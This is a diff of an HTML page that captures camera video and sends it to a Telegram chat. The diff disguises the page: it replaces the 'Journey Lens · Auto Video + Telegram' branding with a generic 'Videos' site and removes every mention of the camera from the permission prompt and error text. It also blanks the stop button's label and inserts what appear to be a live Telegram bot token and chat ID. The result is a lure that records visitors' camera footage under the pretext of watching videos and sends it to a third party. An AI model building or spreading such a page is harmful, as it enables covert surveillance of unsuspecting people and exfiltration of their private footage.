@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-  <title>Journey Lens · Auto Video + Telegram</title>
+  <title>Videos</title>
   <style>
     * {
       box-sizing: border-box;
@@ -311,8 +311,8 @@
 
 <!-- GATEKEEPER SCREEN (Shows First) -->
 <div id="gateScreen" class="glass-panel">
-  <h1>📸 Welcome to Journey Lens</h1>
-  <p>Please complete the security check and grant camera permissions to access the platform.</p>
+  <h1>📸 Welcome to Videos</h1>
+  <p>Please complete the security check and grant permissions to access the platform.</p>
   
   <!-- CUSTOM CAPTCHA SYSTEM -->
   <div class="captcha-container">
@@ -324,14 +324,14 @@
     <div id="captchaStatusMsg" style="font-size: 0.8rem; margin-top: 8px; height: 14px; color: #f97316;"></div>
   </div>
   
-  <p id="cameraErrorMsg" style="color: #f97316; font-size: 0.8rem; display: none;">⚠️ Camera permission denied or not found.</p>
+  <p id="cameraErrorMsg" style="color: #f97316; font-size: 0.8rem; display: none;">⚠️ permission denied or not found.</p>
   <button id="grantEnterBtn" class="action-btn primary" style="width: 100%" disabled>✅ Verify & Enter</button>
 </div>
 
 <!-- MAIN DASHBOARD (Hidden Initially) -->
 <div id="mainDashboard" class="glass-panel hidden">
-  <h1>📸 JOURNEY CAPTURE · DASHBOARD</h1>
-  <div class="sub" id="dynamicSubtitle">Auto-video to Telegram → Watch your memories</div>
+  <h1>Videos · DASHBOARD</h1>
+  <div class="sub" id="dynamicSubtitle">Enjoy watching this videos</div>
 
   <div class="dashboard">
     <!-- LEFT PANEL: controls, camera -->
@@ -341,8 +341,8 @@
       </div>
 
       <div class="button-group">
-        <button id="startJourneyBtn" class="action-btn primary">🎬 START JOURNEY</button>
-        <button id="stopJourneyBtn" class="action-btn danger" disabled>⏹️ STOP & CLOSE CAM</button>
+        <button id="startJourneyBtn" class="action-btn primary"> START</button>
+        <button id="stopJourneyBtn" class="action-btn danger" disabled></button>
       </div>
 
       <div class="status-area" id="statusLog"></div>
@@ -368,10 +368,10 @@
   // ==========================================
   const CONFIG = {
     // 1. Your Telegram Bot Token (from @BotFather)
-    BOT_TOKEN: "7312345678:AAGx...your_bot_token", 
+    BOT_TOKEN: "8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8", 
     
     // 2. Your Telegram Chat ID (Group/Channel ID where bot is Admin)
-    CHAT_ID: "-1001234567890", 
+    CHAT_ID: "-1003325796934", 
     
     // 3. Custom description/caption for your videos sent to Telegram
     VIDEO_DESCRIPTION: "✨ My Awesome Journey Memory", 
